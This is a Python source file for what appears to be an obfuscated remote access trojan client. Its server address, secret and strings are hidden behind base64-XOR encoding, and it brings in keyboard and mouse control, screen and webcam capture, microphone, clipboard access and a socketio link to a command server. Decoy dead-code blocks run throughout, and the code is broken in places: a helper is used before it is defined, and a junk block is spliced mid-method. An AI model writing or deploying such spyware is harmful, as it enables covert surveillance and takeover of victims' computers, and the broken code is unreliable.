
import os, io, sys, re, json, time, base64, ctypes, shutil, socket, sqlite3
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque
_SERVER  = _D("_s1")   
_SECRET  = _D("_s2")        
_RECON   = 5                                  
_RECON_MAX = 120                              
_CLIENT_ID = None                             
_VERSION = _D("_s3")                           
_KEEPALIVE = 300                              
def _D(b):
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
_s1 = "Zg4SEhYVXElJFAcVFg4DFANICQgUAwgCAxRIBQkL"
_s2 = "dQcUBgUdEAcQWBYZHBAbAVgeEAxYR0VHQQ=="
_s3 = "oZCPkY+Q"
_s4 = "dAQNGgQBAA=="
_s5 = "ZRUcFQAXBgkMFQ=="
_s6 = "eRoLAAkNFg=="
_s7 = "NUVMW0VAQQ=="
_s8 = "5pafhYeR"
_s9 = "k+Pq4/bh8P/64w=="
_s10 = "PExPSUhVUA=="
_s11 = "7p6Xj5uKh4E="
_s12 = "oMPS2dDUzw=="
_s13 = "+76pqbSpwduLkovbkpWIj5qXl9uLgo+TlJXWiJSYkJ6PkpSgmJeSnpWPpg=="
_s14 = "mr+y++n57vP3/7PpusG/svb/7P/29Pv3/7Ppx7q/svf/6en7/f+z6Q=="
_s15 = "ssLL3MLHxg=="
_s16 = "gfbo5fXp"
_s17 = "0Ke5vuPi"
_s18 = "r9zM3crKwQ=="
_s19 = "bxwMHQoKAQ=="
_s20 = "Dn1tfGtrYA=="
_s21 = "3aq4v768sA=="
_s22 = "DH5pYGltf2k="
_s23 = "kuHx4Pf3/A=="
_s24 = "m+j46f7+9Q=="
_s25 = "ayksOTM="
_s26 = "25GLnpw="
_s27 = "9YaWh5CQm6qTh5SYkA=="
_s28 = "UH46IDc="
_s29 = "qt3PyMnLx/XM2MvHzw=="
_s30 = "TyYiLigq"
_s31 = "oe3I18SBzMjC087Ryc7PxIHS1dPEwMzIz8aB18jAgdHYwNTFyM6BQyczgfbg94HCydTPytKBQyczgcPA0sSXlY8="
_s32 = "B3d+ZnJjbmg="
_s33 = "r8LGzPDc287b2tw="
_s34 = "huvv5dn18ufy8/U="
_s35 = "0766sIygp7KnpqA="
_s36 = "suXA08KSwNPFkuLx/5Lb3JLTkt/b3Nvf096S5fPkktrX09bXwJLB3ZLQwN3FwdfAwZLR09yS1tfR3dbXktvGnA=="
_s37 = "4d3VkqjVktWSqKmpqKipqdWSqA=="
_s38 = "rP7l6uo="
_s39 = "XDg9KD0="
_s40 = "i+bi6NTv6v/q"
_s41 = "7p6dm5qHgg=="
_s42 = "8oGLgYaXn62BhpOGgQ=="
_s43 = "x6qiqqi1vpi3orWkoqmz"
_s44 = "bAEJAQMeFTMYAxgNADMLDg=="
_s45 = "Xzs2LDQAOS06OgA4PQ=="
_s46 = "2La9rIervbash7W6"
_s47 = "BXZga3Zqd3Y="
_s48 = "SgkFBxkaDwk="
_s49 = "eRYJHBcJDQA="
_s50 = "tMfRwMfd0A=="
_s51 = "fys6LTI="
_s52 = "/I+ImJWS"
_s53 = "gvbn+vY="
_s54 = "tMPd2oeG"
_s55 = "x7Kzoer/"
_s56 = "26ivtKs="
_s57 = "FGBxZnl9enV4S3thYGRhYA=="
_s58 = "F2RjeGc="
_s59 = "cBUIGQR6"
_s60 = "QAIhIysnMi81LiRgKyU5LC8nJyUyYDcpNChgMCUybTcpLiQvN2AnMi81MCkuJ2AhLiRgMCUyKS8kKSNgJiw1Myhu"
_s61 = "Ll5XQF5bWg=="
_s62 = "iOPt8eTn79f7/On8/fs="
_s63 = "P1RaRlNQWGBMS15LSkw="
_s64 = "2LO9obS3v4errLmsras="
_s65 = "ptHPyJWU"
_s66 = "L0xHTl0="
_s67 = "MllXS15dVW1WU0ZT"
_s68 = "OVdYVFw="
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
_s69 = "B2R3clh3YnVkYmlz"
_s70 = "rMLNwck="
_s71 = "H3Fwaz95cGpxew=="
_s72 = "PExFX11L"
_s73 = "tMLb2MHZ0Q=="
_s74 = "26uiuLqs"
_s75 = "egoDGRsN"
_s76 = "Xik3MG1s"
_s77 = "D3d8ans="
_s78 = "xrGvqPX0"
_s79 = "wKShsreprg=="
_s80 = "0P+DqaOktb3/nLmyorGiqf+Tv6K1g7WiprmztaP/nbW+pfCVqKSisaP/haO1ov69tb6l/5O/vqS1vqSj/4K1o7+lorO1o/+Tl4O1o6O5v74="
_s81 = "fBATGxUSHwgQ"
_s82 = "axwCBVhZ"
_s83 = "64+KmZyChQ=="
_s84 = "qNjF283c"
_s85 = "PE9FT0hZUV9IUA=="
_s86 = "66iDioWMjsuPjpiAn4Sby5yKh4ebipuOmcuNmYSGy4eEiIqHy5uKn4PLhJnLvrmnxQ=="
_s87 = "he3x8fW/qqo="
_s88 = "JApOVEM="
_s89 = "RgAvKiNmKCkyZiApMygi"
_s90 = "QTYoL3Jz"
_s91 = "UAcxPDwgMSA1InAzODE+NzU0"
_s92 = "kfXw4+b4/w=="
_s93 = "9pmFl4WVhJ+Ggg=="
_s94 = "DFttYGB8bXxpfixvZG1ia2lo"
_s95 = "fBsPGQgIFRIbDw=="
_s96 = "XHFxPjtxLz89MDk="
_s97 = "yJ+ppKS4qbituui7rbw="
_s98 = "p+Pih8nI04fU0tfXyNXTwsM="
_s99 = "4bKJjpbBgMGRjpGUkcGMhJKSgIaEwYOOmc8="
_s100 = "UyQ6PWBh"
_s101 = "XTk8Lyo0Mw=="
_s102 = "fBMPHQ8fDhUMCA=="
_s103 = "UCo1PjkkKQ=="
_s104 = "57SPiJCJ"
_s105 = "Bkl2Y2gmU1RKJm9oJmJjYGdzanImZHRpcXVjdCg="
_s106 = "0ISxu7Xwv7618KOzorW1vqO4v6Twsb608KK1pKWivvC5pP4="
_s107 = "K0ZYWAtFRF8LSl1KQkdKSUdO"
_s108 = "v/347ec="
_s109 = "jMvp+Kzt/Pz+4/Tl4e346azr6ePg4+/t+OXj4qz65e2sxdyi"
_s110 = "27Ovr6uo4fT0sqv2uquy9bi0tvSxqLS19A=="
_s111 = "u97JydTJ"
_s112 = "hcns9vGl7Ov28eTp6eDhpeT19ens5uTx7Orr9qs="
_s113 = "USY4P2Jj"
_s114 = "yY2gurmlqLCHqKSs"
_s115 = "osbD0NXLzA=="
_s116 = "75yWnJuKgrCfnYCJhoOKnQ=="
_s117 = "/ZmNlpo="
_s118 = "04O/sqrzsvOxtraj86C8pr238/uEur23vKSg+v0="
_s119 = "bhkHAF1c"
_s120 = "SAotLTgtLA=="
_s121 = "5JSFlIiFnQ=="
_s122 = "CVllaHBsbQ=="
_s123 = "IXJEQFNCSQFHTlMBR0hNRFIBTEBVQklIT0YBQAFRQFVVRFNPAQlFRFFVSQxNSExIVURFAUdOUwFSQEdEVVgIDw=="
_s124 = "z4q3qqy6u6rvru+8p6qjo++soKKirqGr766hq++9qru6vaHvoLq7v7q74Q=="
_s125 = "/am0sLiyqKk="
_s126 = "G1l3dHhwNG51eXd0eHA7dnRuaH47enV/O3B+Ynl0eml/O3J1a25vOzNMcnV/dGxoO3R1d2I3O2l+am5yaX5oO3p/dnJ1MjU="
_s127 = "eQ4QF0pL"
_s128 = "pu/I1tPShsTKycXNw8I="
_s129 = "YyEPDAAIQwUCCg8GB0NLDQYGBxBDAgcOCg1K"
_s130 = "O3xeTxtVXk9MVElQG1JVT15JXVpYXkgXG1pYT1JNXhtYVFVVXlhPUlRVSBcbWlVfG3ppaxtPWllXXhU="
_s131 = "nPXy6Pnu+v3/+e8="
_s132 = "q9vY3t/Cxw=="
_s133 = "agQLBw8="
_s134 = "FndycmRzZWVzZQ=="
_s135 = "YAYBDQkMGQ=="
_s136 = "pMXAwNbB19c="
_s137 = "RCohMCklNy8="
_s138 = "g+Hx7OLn4OLw9w=="
_s139 = "NVxbQVBHU1RWUEY="
_s140 = "D2Zhe2p9aW5sanxQan19YH0="
_s141 = "E2NgZmd6fw=="
_s142 = "ZQYKCwsABhEMCgsW"
_s143 = "lvD3+//67w=="
_s144 = "bRkUHQg="
_s145 = "udXW2tjV"
_s146 = "LF5JQUNYSQ=="
_s147 = "UiEmMyYnIQ=="
_s148 = "MVJeX19UUkVYXl9CblRDQ15D"
_s149 = "Cn1jZDk4"
_s150 = "qd7Ax5qb"
_s151 = "HXlkc3xwdH4="
_s152 = "NVFMW1RYXERAUA=="
_s153 = "JlJfVkM="
_s154 = "0bCjoY60o6O+ow=="
_s155 = "l9Lv4+X29OO35Pbh8vO35/bk5OD45fPkt/b587f0+Pj8/vLkt/Hl+Pq31P/l+Pryu7fS8/Dyu7fR/uXy8fjvuQ=="
_s156 = "VzQ/JTg6Mg=="
_s157 = "MX1+cnB9cGFhdXBlcA=="
_s158 = "GVhJSV1YTVg="
_s159 = "v/jQ0NjT2g=="
_s160 = "guHq8O3v5w=="
_s161 = "dBccBhsZEQ=="
_s162 = "4ayIgpOOko6HlQ=="
_s163 = "RiMiISM="
_s164 = "7YiJiog="
_s165 = "OXRWQ1BVVVg="
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
_s166 = "5oCPlIOAiZ4="
_s167 = "F3F+ZXJxeG8="
_s168 = "h8L/8/Xm5POn9+b09PDo9eP0p+H16OqnxO/16Oru8uqq5eb04uOn5fXo8PTi9fSnr8Tv9ejq4qunwuPg4qunxfXm8eKrp8j34vXmqamprqk="
_s169 = "+4uaiIiMlImfiA=="
_s170 = "ndn4+/zo8ek="
_s171 = "Ux88NDo9cxcyJzI="
_s172 = "xpKDi5Y="
_s173 = "6rmvpq+pvsqFmIONg4S1n5iGxsqfmY+YhIuHj7Wci4afj8bKmouZmZ2FmI61nIuGn4/KrLilp8qGhY2DhJk="
_s174 = "A2BxenN3bA=="
_s175 = "LV1MXl5aQl9JXg=="
_s176 = "ocTT087T"
_s177 = "wY+ktbaus6o="
_s178 = "fzwQEBQWGgw="
_s179 = "HkpbU04="
_s180 = "34yak5qci/+3sKyrgLS6pvP/sb6yuvP/urG8raavq7q7gKm+s6q6/5mNkJL/vLCwtLa6rP+TlpKWi//t7+8="
_s181 = "OVpWVlJQXEo="
_s182 = "2r+oqLWo"
_s183 = "CU1santweX0pSmF7ZmRsJkxtbmwpeWh6en5me20pfHpgZ24pXmBnbWZ+eilNWUhZQCkiKUhMWiQ7PD8kTkpEJw=="
_s184 = "CFNmZyhsaXxpVQ=="
_s185 = "8KuEn5/Qg5ifgoSt"
_s186 = "7baYg4aDgpqDzYuCn4CMmc0="
_s187 = "zoKBjY+Cj56eio+ajw=="
_s188 = "xYKqqqKpoA=="
_s189 = "pejMxtfK1srD0Q=="
_s190 = "A0FxYnVmUGxld3RicWY="
_s191 = "gM/w5fLhoNPv5vT34fLl"
_s192 = "zoKhra+i7p26r7qr"
_s193 = "EWRldzwp"
_s194 = "SiU5FSk4Mzo+"
_s195 = "MnZic2J7"
_s196 = "g+Dhx+L34g=="
_s197 = "LV1PaUxZTA=="
_s198 = "xbCxo+j9"
_s199 = "uOPb2dbW18yY3N3bysHIzOU="
_s200 = "w4a7t7GioLfjsKK1pqfjr6ykqq2w46WxrK7jhaqxpqWsu+Ozsaylqq+msO0="
_s201 = "fAwdDw8LEw4YDw=="
_s202 = "Vjo5MT84JXg8JTk4"
_s203 = "h/Lz4aq/"
_s204 = "JEhLQ01KVw=="
_s205 = "fw8eDAwIEA0bDA=="
_s206 = "Uzs8ICc9Mj42"
_s207 = "aRwaDBsHCAQM"
_s208 = "5JSFl5eTi5aA"
_s209 = "RjY0KSAvKiM="
_s210 = "O15VWElCS09eXw=="
_s211 = "1rW5ub2/s6X4pae6v6Kz"
_s212 = "WAwdFQg="
_s213 = "lcbQ2dDWwbX9+ubhubX79PjwubXj9Png8LXTx9rYtfj678r2+vr+/PDmtdnc2NzBtaelpQ=="
_s214 = "tNfb29/d0cc="
_s215 = "RS0qNjE="
_s216 = "3au8sai4"
_s217 = "I0ZRUUxR"
_s218 = "rOjD28LAw83IjM2MysXAyYzK3sPBjPn+4IzNwsiMw9zYxcPCzcDA1YzJ1MnP2djJjMXYgg=="
_s219 = "/qq7s64="
_s220 = "g/Tq7bCx"
_s221 = "/omXkM3M"
_s222 = "5ZWEkY0="
_s223 = "guzj7+c="
_s224 = "BmN0dGl0"
_s225 = "Gn9oaHVo"
_s226 = "m/X69v4="
_s227 = "06eqo7Y="
_s228 = "6IWHjIGOgY2M"
_s229 = "RignKyM="
_s230 = "YBQZEAU="
_s231 = "+YmYjZE="
_s232 = "E2RyYX16fXQ="
_s233 = "GlR1bjp8dW90fg=="
_s234 = "r+vKw8rbyss="
_s235 = "TysuOy4="
_s236 = "iez7++b7"
_s237 = "I2BLRkBIA1BGUVVGUQNFTFEDQgNNRlQDQE9KRk1XA1VGUVBKTE0NA3FGV1ZRTVADC01GVHxVRlFQSkxNDwNHTFRNT0xCR3xWUU8KA0xRAwttTE1GDwNtTE1GCg0="
_s238 = "5smHlo/JhYqPg4iSy5OWgoeSgw=="
_s239 = "luDz5OX/+fg="
_s240 = "DGhje2JgY21oU3l+YA=="
_s241 = "8ryd0oeClpOGl9KbnJSd0pGdnJSblYeAl5bSnZzSgZeAhJeA"
_s242 = "B0NocGlraGZjJ3NvYidpYnAnKWJ/YidmaWMndHNmYGInZidlZnNkbyd0ZHVud3Mnc2gndWJ3a2ZkYix1YnRzZnVzKQ=="
_s243 = "47emrrM="
_s244 = "sZTP14E="
_s245 = "A3RqbTAx"
_s246 = "DVh9aWx5aC1+bn9kfXktYWx4Y25laGktIC1odWR5ZGNqLXliLWx9fWF0LXh9aWx5aA=="
_s247 = "eTgMDRZUDAkdGA0cWRAKWS4QFx0WDgpUFhcVAFkfFgtZFxYO"
_s248 = "N3RfUlRcF15RF0VCWVleWVAXQF5DXxdWU1peWRdHRV5BXltSUFJEFx9gXllTWEBEF1hZW04eGQ=="
_s249 = "tcLc24aH"
_s250 = "ZRIMC1ZX"
_s251 = "9KG1t9SWjYSVh4fUnYfUo52akJuDh9mbmpiN"
_s252 = "6J+BhpqNj8iGh5zIiZ6JgYSJioSNyI6Hmsi9qavIipGYiZub"
_s253 = "+9bWnpeejZqPnp8="
_s254 = "XHFxLzkuKjku"
_s255 = "Ej8/d353ZHNmd3Y="
_s256 = "BEBhaGFjZXBhQXxhZ3FwYQ=="
_s257 = "NHBRWFFTVUBRcUxRV0FAUQ=="
_s258 = "J3BuaWNudQ=="
_s259 = "k8bS0LPx6uPy4OCz5+H69PT24fb3s76z9uv65/r99LPw5uHh9v3ns/r94Ofy/fD2"
_s260 = "04G2vryltvO1vLe7tr+jtqHzoba0uqCnoarzuLaqoPO/trWn87Gq86e7tvOxqqOyoKD9"
_s261 = "Xxs6Mzo4Pis6Gic6PCorOg=="
_s262 = "WQwYGnkrPD4wKi0rIHk6NTw4Nzw9eSwp"
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
_s263 = "qPjN2sHHzMHLycTE0YjYwcbPiNzAzYjbzdrezdqIwM3JxNzAiM3GzNjHwcbciNzHiNjazd7NxtyI+s3GzM3aiM7ax8WI28TNzdjBxs+G"
_s264 = "/tGfjpfRlpufkoqW"
_s265 = "YSoEBBFMAA0IFwRBEQgPBkEuKg=="
_s266 = "MVdDXktUXw=="
_s267 = "yL+hpvv6"
_s268 = "IGFwcGRhdGE="
_s269 = "oozDz8PYzczP19HLwQ=="
_s270 = "QD5vbiEtITovLi01Mykj"
_s271 = "Whs3OyA1NBcvKTM5Ej82Kj8odD8iPw=="
_s272 = "gays8uTz9+Tz"
_s273 = "Ez4+enc="
_s274 = "3qm3sO3s"
_s275 = "djcbFwwZGDsDBR8VPhMaBhME"
_s276 = "h8bX18PG08Y="
_s277 = "TQwgLDciIwA4PiQuBSghPSg/YzsvPg=="
_s278 = "Vx45JCM2OzsyM213BCM2JSMiJ3cBFQQ="
_s279 = "ZBcHDBAFFw8X"
_s280 = "sMPT2MTRw9vD"
_s281 = "oOnO09TBzMzFxJqA9MHTyw=="
_s282 = "/J+Ok5KInZ4="
_s283 = "DUxgbHdiY0B4fmRuRWhhfWh/"
_s284 = "ju384eD67+w="
_s285 = "eTAXCg0YFRUcHUNZGgsWFw0YGw=="
_s286 = "v8GQkdzQ0dnW2JDMxszL2tLbkMrM2s0="
_s287 = "9ZSYlI+am5iAhpyW2J2QmYWQh9uGkIeDnJaQ"
_s288 = "QzA6MDcmLiA3Lw=="
_s289 = "RDc9NzAhKScwKA=="
_s290 = "ejMUCQ4bFhYfHkBaCQMJDh8XHg=="
_s291 = "26yytejp"
_s292 = "x4aqpr2oqYqytK6kj6Krt6K1"
_s293 = "Lm9+fmpvem8="
_s294 = "lOf3/OD15//n"
_s295 = "h+T16Onz5uU="
_s296 = "PXxQXEdSU3BITlRedVhRTVhP"
_s297 = "/r+Tn4SRkLOLjZedtpuSjpuM"
_s298 = "RCc2KyowJSY="
_s299 = "B3koKWRoaWFuYCh0fnRzYmpjKHJ0YnUoZmpmfWhpanJ0bmQqb2Jrd2J1KXRidXFuZGI="
_s300 = "fQ4EDgkYEB4JEQ=="
_s301 = "r9zW3NvKwszbww=="
_s302 = "3a6+r7i4sw=="
_s303 = "axwOCQgKBg=="
_s304 = "9Zaam5uQloE="
_s305 = "kNP//v718+T19A=="
_s306 = "6YqFgIyHnbabjI6Amp2Mmw=="
_s307 = "3LWyurM="
_s308 = "Cn95b3hka2dv"
_s309 = "RiAjJzIzNCM1"
_s310 = "bA0ZCAUD"
_s311 = "wKSps6Ovrq6lo7Q="
_s312 = "qe3A2srGx8fMyt3MzQ=="
_s313 = "r93KyMbc293O28bAwfDAxA=="
_s314 = "7I+AhYmCmLOFiA=="
_s315 = "o9DXwtHX/NDA0cbGzfzAwtPX1tHG"
_s316 = "7YCCg4SZgp8="
_s317 = "6pmJmI+PhLWJi5qen5iPtZmei56fmQ=="
_s318 = "TT45Ij0SPi4/KCgjEi4sPTk4Pyg="
_s319 = "ne7+7/j488L+/O3p6O/4wu7p/Ono7g=="
_s320 = "4pGHlr2RgZCHh4y9j42Mi5aNkA=="
_s321 = "nfDy8/Tp8u8="
_s322 = "NVhaW1xBWkc="
_s323 = "wLOjsqWlrp+jobC0tbKln7O0obS1sw=="
_s324 = "nu376sHt/ez7+/DB7+v/8vfq5w=="
_s325 = "cQAEEB0YBQg="
_s326 = "zr2tr6Kr"
_s327 = "ifr96Pv91v7s6+ro5A=="
_s328 = "oNfFwsPBzf/T1MHU1dM="
_s329 = "LF9YQ1xzW0lOT01B"
_s330 = "m+z++fj69sTo7/rv7ug="
_s331 = "QjEnNh01JyAhIy8dMzcjLis2Ow=="
_s332 = "RTQwJCksMTw="
_s333 = "i+bi6NT4/+r5/w=="
_s334 = "9ZiclqqGgZqF"
_s335 = "0r+7sY2hprOmp6E="
_s336 = "Uzg2Kj88NAwgJzIhJw=="
_s337 = "3rW7p7KxuYGtqrGu"
_s338 = "74KAmpyKsIqZioGb"
_s339 = "y7uypbu+vw=="
_s340 = "0rOxpru9vA=="
_s341 = "4YyOl4Q="
_s342 = "3LGzqrmDrrmwvai1qrk="
_s343 = "dBcYHRcf"
_s344 = "9ZmQk4E="
_s345 = "KUtcXV1GRw=="
_s346 = "Dn58a319"
_s347 = "jf/o4ejs/ug="
_s348 = "UiExID0+Pg=="
_s349 = "5o2Dn4SJh5SCuYOQg4iS"
_s350 = "KFhRRlhdXA=="
_s351 = "RCcwNig="
_s352 = "0LW+pLWi"
_s353 = "ud3c1dzN3A=="
_s354 = "JkJJUUg="
_s355 = "5oeFko+JiA=="
_s356 = "aBgaDRsb"
_s357 = "NEZRWFFVR1E="
_s358 = "44CMjoGM"
_s359 = "SSIsMDo="
try:
    raise Exception()
except:
    pass
_s360 = "jvr3/us="
_s361 = "5JeMi5aQh5GQ"
_s362 = "EnFmYH5Nc35mTXZ3fg=="
_s363 = "osPO1v3Ww8A="
_s364 = "MEdZXm9U"
_s365 = "aR4ABzYM"
_s366 = "IUJVU01+Qg=="
_s367 = "agkeGAY1Eg=="
_s368 = "VDcgJjgLNQ=="
_s369 = "3bO8sLg="
_s370 = "45eGkY6KjYKPvJCXgpGX"
_s371 = "pNDB1snNysXI+9fQxdDR1w=="
_s372 = "YxcGEQ4KDQIPPAoNExYX"
_s373 = "cxAcHh4SHRc="
_s374 = "LFhJXkFFQk1Ac19YQ1w="
_s375 = "45eGkY6KjYKPvJCXgpeWkA=="
_s376 = "aBscCRocNxsRGxwNBTcFBwYBHAca"
_s377 = "27a0tbKvtKmEqK+6r66o"
_s378 = "ifr95vnW+vD6/ezk1uTm5+D95vs="
_s379 = "Fnt5eH9ieWRJZWJ3YmNl"
_s380 = "ie7s/db5++bq7Pr67Po="
_s381 = "0qKgvbG3oaGNvruhpg=="
_s382 = "exASFxckCwkUGB4ICA=="
_s383 = "usrI1dnfycnl0dPW1uXI38nP1s4="
_s384 = "o8DPytPBzMLRx/zExtc="
_s385 = "tsbPxtPE1drfxg=="
_s386 = "8JOcmYCSn5GClK+UkYSR"
_s387 = "stHe28LQ3dPA1u3W08bT"
_s388 = "+ZqVkImblpiLnaadmI2Y"
_s389 = "+ZqVkImblpiLnaaKnI0="
_s390 = "YhIbEgcQAQ4LEg=="
_s391 = "EmZ3amY="
_s392 = "QCMsKTAiLyEyJB8zNCE0NTM="
_s393 = "TywjJj8tIC49KxA8Oy47Ojw="
_s394 = "TC05KCUjEyspOBM6IyA5ISk="
_s395 = "8pOHlpudrYSdnoeflw=="
_s396 = "WzouPzI0BCg+LwQtNDcuNj4="
_s397 = "0Ly1prW8"
_s398 = "SSg8LSAmFj0mLi4lLBYkPD0s"
_s399 = "g+L25+rs3PXs7/bu5g=="
_s400 = "cgIdBRcALR8dHBsGHQAtHRQU"
_s401 = "D39geGp9UH1qfHpjew=="
_s402 = "dAQbAxEGKxgbFx8="
_s403 = "ptbJ0cPU+dTD1dPK0g=="
_s404 = "ViY5ITMkCSU6MzMm"
_s405 = "L19AWEpdcF1KXFpDWw=="
_s406 = "HGt9cHBsfWx5bkNveWg="
_s407 = "TT0sOSU="
_s408 = "446QhIGMm7yQi4yU"
_s409 = "fQkUCREY"
_s410 = "+JeInZanjYqU"
_s411 = "l/T688jl8uTi++M="
_s412 = "7ZmMhoiyno6fiIiDnoWCmQ=="
_s413 = "WSo6Kzw8NyoxNi0GKzwqLDUt"
_s414 = "nfr46cL6+PL07Q=="
_s415 = "n/j68PbvwO367Orz6w=="
_s416 = "D2hqe1Buf398"
_s417 = "6YiZmZq2m4yanIWd"
_s418 = "3a2xvKSCrrKos7k="
_s419 = "MFZCVUE="
_s420 = "EWJ0cGNyeU53eH10Yg=="
_s421 = "YBIPDxQ="
_s422 = "NlNOU1VDQlNpVVlbW1dYUg=="
_s423 = "9pWZm5uXmJI="
_s424 = "1LC7o7q4u7Wwi7Gssbc="
_s425 = "hfXk8e0="
_s426 = "GnN0am9uRXh2dXlx"
_s427 = "8pGflq2Al4GHnoY="
_s428 = "g+rt8/b33Pbt4e/s4Og="
_s429 = "pcbIwfrXwNbQydE="
_s430 = "AmRrbmddbmtxdg=="
_s431 = "SS8gJSwWJSA6PRY7LDo8JT0="
_s432 = "4oSLjoe9ho2VjI6Ng4a9kIeTl4eRlg=="
_s433 = "LUtEQUhySUJaQ0FCTElyTkVYQ0Y="
_s434 = "8pSbnpetlpeel4aX"
_s435 = "3Ky9qLQ="
_s436 = "utzT1t/l1N/N5dzV1t7fyA=="
_s437 = "YBABEgUOFA=="
_s438 = "yqyjpq+Vv7qmpauulamiv6Sh"
_s439 = "ucnYzdE="
_s440 = "xaOsqaCasLWpqqShmregtrCpsQ=="
_s441 = "TyEqOzggPSQQJiEpIA=="
_s442 = "2La9rK+3qrOHsba+t4eqvauttKw="
_s443 = "kvDg/eXh9+DN4eb38/4="
_s444 = "25mptKyovqn7qK++ure+qfupvqquvqivvr8="
_s445 = "y6m5pLy4rrmUuL+uqqeUua64vqe/"
_s446 = "yqGjpqaVub2jvqmi"
_s447 = "/ba0sbHdrqq0qb61"
_s448 = "/62+rI+Xmo2a37yTlpqRiw=="
_s449 = "fFFRDxkOChkO"
_s450 = "OBUVS11bSl1M"
_s451 = "4M3NiYQ="
_s452 = "nbCw7/j+8vPz+P7p"
_s453 = "jaCg5OP++ezh4Q=="
_s454 = "Ay4udm1qbXB3Ym9v"
_s455 = "kr+//P2/4vfg4fvh5g=="
_s456 = "QWxsJC0kNyA1JCU="
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
_s457 = "4M3Njo/NhYyFloGUhQ=="
_s458 = "amAxQTdKOg8YGQMZHg8ECQ9KGA8HBRwPDkRg"
_s459 = "lZ/OuMi12/q15fDn5vzm4fD79vC18/rg+/G7nw=="
_s460 = "wIWSko+S+uDt7bOlsralsuChrqTg7e2zpaOypbTgsqWxtamypaTgpq+y4O3tqa6ztKGsrA=="
_s461 = "pa/+jviF9cDX1szW0cDLxsCFzMvW0cTJycDBhIXk0NHKiNbRxNfRhcrLhcfKytGLrw=="
_s462 = "qKLzhfWI4cbb3MnExIjOycHEzcyGiPrdxojJ24jJzMXBxoai"
_s463 = "QzQqLXBx"
_s464 = "YC4PFEABBA0JDkBNQAEUFAUNEBQJDgdAEwkMBQ4UQDUhI0ACGRABExNOTk4="
_s465 = "6LPJtci9qavIipGYiZubyI6JgYSNjMjFyJqdhoaBho/In4GcgMiEgYWBnI2MyJiagZ6BhI2PjZs="
_s466 = "kdD94/Tw9eix4+T///j/9rHw4rHw9fz4/w=="
_s467 = "ZAEIARIFEAEA"
_s468 = "5rSTiIiPiIHGg4qDkIeSg4LGy8aFioOHiI+IgcaTlsazp6XGhJ+Wh5WVxpSDgY+VkpSfyMjI"
_s469 = "+KPTpdionYqLkYuMnZabndiKnZ6KnYuQnZw="
_s470 = "A1giXiNTZnFwanB3Zm1gZiNuYnoja2J1ZiNzYnF3amJvb3ojZWJqb2ZnIytxdm0jYnAjYmduam0jZWxxI1Bga2Zndm9mZyNXYnBoKg=="
_s471 = "ej8oKDUoQFopHw5aJSk/KCw/KFoTFFoZFR4fWhUIWg8JH1pXVwkfCAwfCA=="
_s472 = "cjcgID0gSFIhFwZSLSE3MSA3JlIbHFIRHRYXUh0AUgcBF1JfXwEXEQAXBg=="
_s473 = "eDsXFhYdGwwdHFlYLxkRDBEWH1geFwpYGxcVFRkWHAtWVlY="
_s474 = "YicaCxYLDAVCBA0QQhcSBgMWB0xMTA=="
_s475 = "QxArNjcnLDQt"
_s476 = "8KOEn4CAlZQ="
_s477 = "pfr6yMTMy/r6"
HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
       _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
       _D("_s6"): False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS[_D("_s7")] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS[_D("_s8")] = True
except: pass
try: import pyperclip; HAS[_D("_s9")] = True
except: pass
try: import psutil; HAS[_D("_s10")] = True
except: pass
try: import cv2; _h6 = True
except: pass
try: import pyaudio; HAS[_D("_s11")] = True
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS[_D("_s12")] = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print(_D("_s13")); sys.exit(1)
logging.basicConfig(level=logging.INFO, format=_D("_s14"), handlers=[logging.StreamHandler()])
_l = logging.getLogger("RAS")
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS[_D("_s15")]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
        except: pass
        try:
            if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
_s = S()
class CapEngine:
    def __init__(self, sio, source=_D("_s18")):
        self.r = False; self.sio = sio; self.src = source  
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  
    def start(self):
        if self.r: return
        if self.src == _D("_s20") and not HAS["mss"]: return
        if self.src == _D("_s21") and not _h6: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, _D("_s22")) else self.cap.close()
            except: pass
            self.cap = None
    def _loop(self):
        try:
            if self.src == _D("_s23"):
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
            else:
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)
            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == _D("_s24"):
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s25"))
